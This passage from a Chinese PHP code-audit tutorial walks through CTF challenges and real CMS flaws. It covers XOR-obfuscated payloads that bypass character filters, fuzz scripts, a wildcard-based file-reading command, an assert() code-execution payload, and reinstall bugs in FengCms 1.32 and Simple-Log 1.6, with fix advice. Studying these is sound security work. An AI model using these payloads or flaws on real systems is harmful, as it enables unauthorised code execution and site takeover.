<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;$&#123;<span class="variable">$_</span>&#125;[_]($&#123;<span class="variable">$_</span>&#125;[__]);&amp;_=getFlag</span><br><span class="line">拆解如下：        第<span class="number">1</span>个GET请求参数：code                &amp;     第<span class="number">2</span>个GET请求参数：_</span><br><span class="line">   <span class="variable">$_</span>=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;         $&#123;<span class="variable">$_</span>&#125;[_]($&#123;<span class="variable">$_</span>&#125;[__]);     &amp;     _=getFlag</span><br><span class="line">   <span class="variable">$_</span>=<span class="string">&quot;_GET&quot;</span>;                <span class="variable">$_GET</span>[_](<span class="variable">$_GET</span>[__]);     &amp;     _=getFlag</span><br><span class="line">                             <span class="title function_ invoke__">getFlag</span>(<span class="variable">$_GET</span>[__]);</span><br><span class="line">                             <span class="title function_ invoke__">getFlag</span>(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<p>这个 <strong>payload</strong> 的长度是 <strong>37</strong> ，符合题目要求的 <strong>小于等于40</strong> 。另外，我 <strong>fuzz</strong> 出了长度为 <strong>28</strong> 的 <strong>payload</strong> ，如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="string">&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;%1c%1e%0f%3d%17%1a%1c&quot;</span>;<span class="variable">$_</span>();</span><br></pre></td></tr></table></figure>

<p>这里也给出 <strong>fuzz</strong> 脚本，方便大家进行 <strong>fuzz</strong> 测试：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_split</span>(<span class="string">&#x27;getFlag&#x27;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$ch</span> = <span class="string">&#x27;&#123;&#x27;</span>^ <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$ch</span>, <span class="variable">$a</span> , <span class="literal">true</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&#123; ^ chr(&quot;</span>.<span class="variable">$i</span>.<span class="string">&quot;) = <span class="subst">$ch</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;</span>^<span class="title function_ invoke__">chr</span>(<span class="number">28</span>).<span class="title function_ invoke__">chr</span>(<span class="number">30</span>).<span class="title function_ invoke__">chr</span>(<span class="number">15</span>).<span class="title function_ invoke__">chr</span>(<span class="number">61</span>).<span class="title function_ invoke__">chr</span>(<span class="number">23</span>).<span class="title function_ invoke__">chr</span>(<span class="number">26</span>).<span class="title function_ invoke__">chr</span>(<span class="number">28</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-11.png"></p>
<p>后来在安全客看到一种新的思路，也很不错，具体参考：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/154284">CTF题目思考–极限利用</a> 。这篇文章主要是 <strong>利用通配符调用Linux系统命令</strong> 来查看 <strong>flag</strong> ，关于通配符调用命令的文章，大家可以参考： <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/145518">web应用防火墙逃逸技术（一）</a> 。</p>
<p>我们来分析安全客这篇文章中的payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=`/???/??? /????`;<span class="meta">?&gt;</span><span class="meta">&lt;?=</span><span class="variable">$_</span><span class="meta">?&gt;</span></span><br><span class="line">实际上等价于：</span><br><span class="line"><span class="variable">$_</span>=`/bin/cat /FLAG`;<span class="meta">?&gt;</span><span class="meta">&lt;?=</span><span class="variable">$_</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里我想说一下 <strong><?=$_?></strong> 这个代码的意思。实际上这串代码等价于 <strong><? echo $_?></strong> 。实际上，当 <strong>php.ini</strong> 中的 <strong>short_open_tag</strong> 开启的时候， <strong><? ?></strong> 短标签就相当于 <strong><?php ?></strong> ， <strong><?=$_?></strong> 也等价于 <strong><? echo $_?></strong> ，这也就解决了输出结果的问题。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">50</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Too Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not Allowed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__FILE);</span><br><span class="line"><span class="comment">// $hint = &quot;php function getFlag() to get flag&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>这道题目实际上和上面那道题目差不多，只是过滤了一个下划线 <strong>_</strong> 而已，我们可以用中文来做变量名：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$哼=<span class="string">&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;%1c%1e%0f%3d%17%1a%1c&quot;</span>;$哼();</span><br></pre></td></tr></table></figure>

<p>当然，我们也可以 <strong>fuzz</strong> 可用的 <strong>ASCII</strong> 做变量名，<strong>fuzz</strong> 代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    asc = <span class="string">&quot;%%%02x&quot;</span> % i</span><br><span class="line">    url = <span class="string">&#x27;http://localhost/demo/index2.php?code=$%s=&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%%1c%%1e%%0f%%3d%%17%%1a%%1c&quot;;$%s();&#x27;</span> % (asc,asc)</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;HRCTF&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%s 可用&quot;</span> %asc)</span><br></pre></td></tr></table></figure>
<p>可以看到此时 <strong>payload</strong> 长度为 <strong>28</strong> 。当然还有其他 <strong>payload</strong> ，例如下面这样的，原理都差不多，大家自行理解。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$呵=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;$&#123;$呵&#125;[呵]($&#123;$呵&#125;[呵]);&amp;呵=getFlag</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://521-wf.com/archives/45.html">preg_replace的&#x2F;e修饰符妙用与慎用</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1290">老洞新姿势，记一次漏洞挖掘和利用(PHPMailer RCE)</a></p>
<h2 id="Day9-Rabbit"><a href="#Day9-Rabbit" class="headerlink" title="Day9 Rabbit"></a>Day9 Rabbit</h2><p>主要涉及到下面两个函数的缺陷：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.str-replace.php"> str_replace </a>：(PHP 4, PHP 5, PHP 7)</p>
<p><strong>功能</strong> ：子字符串替换</p>
<p><strong>定义</strong> ： <code>mixed str_replace ( mixed $search , mixed $replace , mixed $subject [, int &amp;$count ] )</code> </p>
<p>该函数返回一个字符串或者数组。如下：</p>
<p>str_replace(字符串1，字符串2，字符串3)：将字符串3中出现的所有字符串1换成字符串2。</p>
<p>str_replace(数组1，字符串1，字符串2)：将字符串2中出现的所有数组1中的值，换成字符串1。</p>
<p>str_replace(数组1，数组2，字符串1)：将字符串1中出现的所有数组1一一对应，替换成数组2的值，多余的替换成空字符串。</p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.strstr.php"> strstr </a>：(PHP 4, PHP 5, PHP 7)</p>
<p><strong>功能</strong> ：查找字符串的首次出现</p>
<p><strong>定义</strong> ： <code>string strstr ( string $haystack , mixed $needle [, bool $before_needle = FALSE ] )</code> </p>
<p>返回 <code>haystack</code> 字符串从 <code>needle</code> 第一次出现的位置开始到 <code>haystack</code> 结尾的字符串。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;domain = <span class="title function_ invoke__">strstr</span>(<span class="string">&#x27;hongrisec@gmail.com&#x27;</span>, <span class="string">&#x27;@&#x27;</span>);</span><br><span class="line">&gt;<span class="comment">// 上面输出：@gmail.com</span></span><br><span class="line">&gt;user = <span class="title function_ invoke__">strstr</span>(<span class="string">&#x27;hongrisec@gmail.com, &#x27;</span>@<span class="string">&#x27;, true); // 从 PHP 5.3.0 起</span></span><br><span class="line"><span class="string">&gt;// 上面输出：hongrisec</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="Day10-Anticipation"><a href="#Day10-Anticipation" class="headerlink" title="Day10 Anticipation"></a>Day10 Anticipation</h2><p>主要是很多代码在遇到错误后没有正确执行退出的代码，从而带来一些逻辑错误</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">goAway</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">error_log</span>(<span class="string">&quot;Hacking attempt.&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /error/&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$pi</span>) || !<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$pi</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">goAway</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">assert</span>(<span class="string">&quot;(int)<span class="subst">$pi</span> == 3&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;This is not pi.&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;This might be pi.&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>漏洞解析</strong> ：<br>这道题目实际上讲的是当检测到攻击时，虽然有相应的防御操作，但是程序未立即停止退出，导致程序继续执行的问题。程序在 <strong>第一行处</strong> 使用 <strong>extract</strong> 函数，将 <strong>POST</strong> 请求的数据全都注册成变量， <strong>extract</strong> 函数的定义如下：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.extract.php"> extract </a> ：(PHP 4, PHP 5, PHP 7)</p>
<p><strong>功能</strong> ：从数组中将变量导入到当前的符号表</p>
<p><strong>定义</strong> ： <code>int extract ( array &amp;$array [, int $flags = EXTR_OVERWRITE [, string $prefix = NULL ]] )</code> </p>
</blockquote>
<p>该函数实际上就是把数组中的键值对注册成变量,这样我们就可以控制 <strong>第7行</strong> 处的 <strong>pi</strong>  变量。程序对 <strong>pi</strong>  变量进行简单的验证，如果不是数字或者没有设置 <strong>pi</strong>  变量，程序就会执行 <strong>goAway</strong> 方法，即记录错误信息并直接重定向到 <strong>&#x2F;error&#x2F;</strong> 页面。看来程序员这里是对非法的操作进行了一定的处理。但是关键在于，程序在处理完之后，没有立即退出，这样程序又会按照流程执行下去，也就到了 <strong>第11行</strong> 的 <strong>assert</strong> 语句。由于前面 <strong>pi</strong>  变量可以被用户控制，所以在这一行存在远程代码执行漏洞。</p>
<p>例如我们的payload为：<strong>pi&#x3D;phpinfo()</strong> （这里为POST传递数据），然后程序就会执行这个 <strong>phpinfo</strong> 函数。当然，你在浏览器端可能看不到 <strong>phpinfo</strong> 的页面，但是用 <strong>BurpSuite</strong> ，大家就可以清晰的看到程序执行了 <strong>phpinfo</strong> 函数<br>实际上，这种案例在真实环境下还不少。例如有些CMS通过检查是否存在install.lock文件，从而判断程序是否安装过。如果安装过，就直接将用户重定向到网站首页，却忘记直接退出程序，导致网站重装漏洞的发生。下面我们来看两个真实的案例。</p>
<h3 id="实例分析-1"><a href="#实例分析-1" class="headerlink" title="实例分析"></a>实例分析</h3><h4 id="FengCms-1-32-网站重装漏洞"><a href="#FengCms-1-32-网站重装漏洞" class="headerlink" title="FengCms 1.32 网站重装漏洞"></a>FengCms 1.32 网站重装漏洞</h4><p>本次实例分析，我们选取的是 <strong><a target="_blank" rel="noopener" href="http://pan.baidu.com/s/1i33gNVR">FengCms 1.32</a></strong> 。对于一个已经安装好的 <strong>FengCms</strong> ，当用户再次访问 <strong>install&#x2F;index.php</strong> 时，就会导致网站重装。我们来具体看下程序的逻辑：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(ROOT_PATH.<span class="string">&#x27;/upload/INSTALL&#x27;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;系统已安装，请删除相应安装文件, 请手工删除upload目录下的INSTALL文件！&quot;);&lt;/script&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=/&quot;&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>: <span class="comment">// 安装程序初始化</span></span><br><span class="line">        <span class="keyword">include</span> ABS_PATH.<span class="string">&quot;/step/step1.php&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>: <span class="comment">// 检查系统环境是否符合要求</span></span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>: <span class="comment">// 进行数据库信息输入</span></span><br><span class="line">        <span class="keyword">include</span> ABS_PATH.<span class="string">&quot;/step/step3.php&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>: <span class="comment">// 正在安装</span></span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>: <span class="comment">// 安装完成</span></span><br><span class="line">        <span class="keyword">include</span> ABS_PATH.<span class="string">&quot;/step/step5.php&quot;</span>;</span><br><span class="line">        <span class="variable">$in</span> = <span class="title function_ invoke__">fopen</span>(ROOT_PATH.<span class="string">&#x27;/upload/INSTALL&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$in</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以看到，如果是第一次安装网站，程序会在 <strong>upload</strong> 目录下生成一个 <strong>INSTALL</strong> 文件，用于表示该网站已经安装过(对应上图 <strong>25-28行</strong> 代码)。当我们再次访问该文件时，程序会先判断 <strong>upload</strong> 目录下是否有 <strong>INSTALL</strong> 文件。如果存在，则弹窗提示你先删除 <strong>INSTALL</strong> 文件才能进行网站重装(对应上图 <strong>1-4行</strong> 代码)。但是这里注意了，网站在弹出告警信息后，并没有退出，而是继续执行，所以我们在不删除 <strong>INSTALL</strong> 文件的情况下，仍可以重装网站。</p>
<p>比较有趣的是，原本网站网站成功后，程序会自动删除 <strong>upload</strong> 目录下的所有文件，来防止攻击者重装网站，然而这段代码却在注释当中，具体原因不得而知。</p>
<h4 id="Simple-Log1-6网站重装漏洞"><a href="#Simple-Log1-6网站重装漏洞" class="headerlink" title="Simple-Log1.6网站重装漏洞"></a>Simple-Log1.6网站重装漏洞</h4><p>我们再来看 <strong><a target="_blank" rel="noopener" href="http://down.admin5.com/php/42012.html#link">Simple-Log1.6</a></strong> 网站重装的例子。其 <strong>install\index.php</strong> 文件中，对网站安装成功的处理有问题，其代码是在下图 <strong>17-20行</strong> ，程序只是用 <strong>header</strong> 函数将其重定向到网站首页，然而程序还是会继续执行下去。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 检查输入的魔术引号</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$_GET</span>     = <span class="keyword">empty</span>(<span class="variable">$_GET</span>) ? <span class="string">&#x27;&#x27;</span> : <span class="title function_ invoke__">input_filter</span>(<span class="variable">$_GET</span>);</span><br><span class="line">    <span class="variable">$_POST</span>    = <span class="keyword">empty</span>(<span class="variable">$_POST</span>) ? <span class="string">&#x27;&#x27;</span> : <span class="title function_ invoke__">input_filter</span>(<span class="variable">$_POST</span>);</span><br><span class="line">    <span class="variable">$_COOKIE</span>  = <span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>) ? <span class="string">&#x27;&#x27;</span> : <span class="title function_ invoke__">input_filter</span>(<span class="variable">$_COOKIE</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$setup</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;setup&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;setup&#x27;</span>] : <span class="string">&#x27;check&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(PBBLOG_ROOT.<span class="string">&#x27;home/data/config.php&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(PBBLOG_ROOT.<span class="string">&#x27;home/data/config.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$install_lock</span> &amp;&amp; <span class="variable">$setup</span> == <span class="string">&#x27;finish&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;location: ../index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">.......</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$setup</span> == <span class="string">&#x27;check&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="variable">$setup</span> == <span class="string">&#x27;config&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="variable">$setup</span> == <span class="string">&#x27;finish&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而且程序的安装逻辑其实是有问题的，安装步骤由 <strong>$setup</strong> 变量控制，而 <strong>$setup</strong> 变量可以被用户完全控制(如上图 <strong>第10行</strong> 代码)，攻击者完全可以控制网站的安装步骤。</p>
<p>漏洞利用就极其简单了，我们先来看一下 <strong>FengCms</strong> ，我们直接访问 <strong>install&#x2F;index.php</strong> 页面，无视弹出来的警告<br>可以看到程序仍然可以继续安装。</p>
<p>我们再来看一下 <strong>Simple-Log</strong> 的重装利用：<br><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-12.png"></p>
<p>直接post以上数据，即可重装网站数据。</p>
<p><strong>修复建议</strong></p>
<p>实际上，要修复这一类型的漏洞，我们只要在正确的地方退出程序即可。拿这次的例题举例，我们只需要在检查到非法操作的时候，直接添加退出函数，即可避免漏洞发生。例如使用 <strong>die</strong> 、 <strong>exit</strong> 等函数都是可以的</p>
<h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stophack</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$string</span>))&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$string</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="variable">$string</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">stophack</span>(<span class="variable">$val</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$raw</span> = <span class="variable">$string</span>;</span><br><span class="line">        <span class="variable">$replace</span> = <span class="keyword">array</span>(<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;/&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;%5C&quot;</span>,<span class="string">&quot;%22&quot;</span>,<span class="string">&quot;%27&quot;</span>,<span class="string">&quot;%2A&quot;</span>,<span class="string">&quot;~&quot;</span>,<span class="string">&quot;insert&quot;</span>,<span class="string">&quot;update&quot;</span>,<span class="string">&quot;delete&quot;</span>,<span class="string">&quot;into&quot;</span>,<span class="string">&quot;load_file&quot;</span>,<span class="string">&quot;outfile&quot;</span>,<span class="string">&quot;sleep&quot;</span>,);</span><br><span class="line">        <span class="variable">$string</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$replace</span>, <span class="string">&quot;HongRi&quot;</span>, <span class="variable">$string</span>);</span><br><span class="line">        <span class="variable">$string</span> = <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$string</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$raw</span>!=<span class="variable">$string</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">error_log</span>(<span class="string">&quot;Hacking attempt.&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /error/&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$string</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="title function_ invoke__">stophack</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM students WHERE id=<span 